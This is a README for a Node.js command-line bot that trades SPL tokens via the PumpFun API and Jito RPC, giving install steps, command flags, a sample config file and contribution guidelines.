# PumpFun API Bot 🤖

![PumpFun API](https://img.shields.io/badge/PumpFun%20API-v1.0.0-brightgreen)

Welcome to the **PumpFun API** repository! This project is a lightweight Node.js CLI bot designed to simplify the process of trading SPL tokens. It leverages the PumpFun API and Jito’s high-performance RPC to allow users to build, sign, and send token trades effortlessly. 

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Commands](#commands)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features 🌟

- **Seamless Trading**: Enter your mint, amount, slippage, and tip to initiate trades.
- **Lightweight**: Designed to be efficient and easy to use.
- **High Performance**: Utilizes Jito’s RPC for quick transaction processing.
- **User-Friendly**: Simple command-line interface for quick access.

## Getting Started 🚀

To get started with the PumpFun API bot, you need to have Node.js installed on your machine. You can download it from [nodejs.org](https://nodejs.org).

### Prerequisites

- Node.js (version 14 or higher)
- npm (Node package manager)

## Installation 🛠️

1. Clone the repository:

   ```bash
   git clone https://github.com/ratudijah/pumpfun-api.git
   ```

2. Navigate to the project directory:

   ```bash
   cd pumpfun-api
   ```

3. Install the dependencies:

   ```bash
   npm install
   ```

## Usage 💡

After installation, you can start using the bot. You can find the latest releases and download the necessary files from the [Releases section](https://github.com/ratudijah/pumpfun-api/releases).

### Running the Bot

To run the bot, use the following command:

```bash
node index.js
```

### Example Command

```bash
node index.js --mint YOUR_MINT_ADDRESS --amount YOUR_TOKEN_AMOUNT --slippage YOUR_SLIPPAGE --tip YOUR_TIP_AMOUNT
```

Replace `YOUR_MINT_ADDRESS`, `YOUR_TOKEN_AMOUNT`, `YOUR_SLIPPAGE`, and `YOUR_TIP_AMOUNT` with your desired values.

## Configuration ⚙️

You can configure the bot by editing the `config.json` file located in the root directory. This file allows you to set default values for your mint address, slippage, and other parameters.

### Sample `config.json`

```json
{
  "defaultMint": "YOUR_DEFAULT_MINT_ADDRESS",
  "defaultSlippage": 0.5,
  "defaultTip": 0.01
}
```

## Commands 📝

The bot supports various commands. Here are the primary commands you can use:

- `--mint`: Specify the mint address of the token you want to trade.
- `--amount`: Set the amount of tokens to trade.
- `--slippage`: Define the acceptable slippage percentage.
- `--tip`: Provide a tip amount for the transaction.

## Contributing 🤝

We welcome contributions to the PumpFun API bot! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add some feature'`).
5. Push to the branch (`git push origin feature/YourFeature`).
6. Open a pull request.

Please ensure your code follows the existing style and includes tests where applicable.

## License 📄

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support 💬

If you encounter any issues or have questions, please check the [Releases section](https://github.com/ratudijah/pumpfun-api/releases) for updates and fixes. You can also open an issue in the repository for assistance.

## Conclusion

Thank you for exploring the PumpFun API bot! We hope it simplifies your SPL token trading experience. Feel free to contribute and help improve the project.

![PumpFun API Bot](https://img.shields.io/badge/Join%20Us%20on%20GitHub-blue)

For more details and to stay updated, visit the [Releases section](https://github.com/ratudijah/pumpfun-api/releases).